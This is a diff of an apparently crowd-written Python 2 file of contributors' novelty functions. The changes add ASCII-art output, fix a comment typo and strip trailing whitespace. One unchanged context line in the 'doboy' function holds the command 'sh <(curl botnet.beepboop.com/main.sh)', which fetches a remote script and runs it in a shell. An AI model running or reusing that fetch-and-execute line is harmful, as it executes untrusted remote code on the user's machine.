@@ -8,7 +8,7 @@
 #       - Once your function is written, you can call it from anywhere else in
 #         the already existing exectution chain.
 #       - Never entirely delete anyone else's function, edit it if needed.
-#       - lefin() should be the last executing function, always
+#       - lafin() should be the last executing function, always
 
 # Lets see if we can make something meaningful out of this.
 import array
@@ -810,6 +810,16 @@ def henghonglee():
 def jhgaylor():
     print "Signing in from Starkville, Mississippi."
 
+def hklebs():
+    print "000000000000000000000000000000"
+    print "0000    0000    000000    0000"
+    print "0000    0000    000000    0000"
+    print "0000    0000    00000000000000"
+    print "0000            000000    0000"
+    print "0000    0000    000000    0000"
+    print "0000    0000    000000    0000"
+    print "0000    0000    000000    0000"
+    print "000000000000000000000000000000"
 
 def mmay():
     url = "http://placekitten.com/%d/%d" % \
@@ -1108,7 +1118,7 @@ def doboy(doboy_):
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
-        
+
 def BRBRBRBR():
     print 'Hi from BRAZIL! REMEMBER BRBRBRBRBRBR HUEHUEHUE!'
 
@@ -1668,8 +1678,8 @@ def dlutcat():
 def rypeck():
     import this
     print this.s
-    
-                             
+
+
 def yeco():
     import this
     import antigravity
@@ -1709,7 +1719,7 @@ def typd():
 def icio():
     """
      _     _   _             ____   _   _          ____  __ _____ _____ _   _
-     _     _   _             ____   _   _          ____  __ _____ _____ _   _ 
+     _     _   _             ____   _   _          ____  __ _____ _____ _   _
     | |__ | |_| |_ _ __ _   / / /__| | | |_   _   / /  \/  | ____|_   _| | | |
     | '_ \| __| __| '_ (_) / / / __| | | | | | | / /| |\/| |  _|   | | | |_| |
     | | | | |_| |_| |_) | / / / (__| |_| | |_| |/ / | |  | | |___  | | |  _  |
@@ -1737,21 +1747,21 @@ def sluu99(n):
     while n > 0:
         n = n - 2
     return n == 0
-    
+
 def Caneco():
     return "I'm a, mother father gentleman!"
-    
-    
+
+
 def nands():
     """ Dennis Ritchie was the first person to create a Hello World program """
     print "Hello World"
-    
+
 def papachan():
     """ Is there a duck? """
     animals = ["aardvark", "badger", "duck", "emu", "fennec fox"]
     if "duck" in animals:
         print "OK there is a duck!"
-        
+
 def akkatracker():
     print "I'm glad this isn't in Python 3.2 this much (" + 1000 * "*" + ")"
     print "Follow @akkatracker on pretty much every social media site imaginable :)"
@@ -1761,7 +1771,7 @@ def x3nu():
     a = urllib.urlopen("http://www.x3nu.net/ip.php")
     b = a.read()
     print "The public IP of your PC is = " + b
-                             
+
 
 def nikitachernov():
     print requests.get(
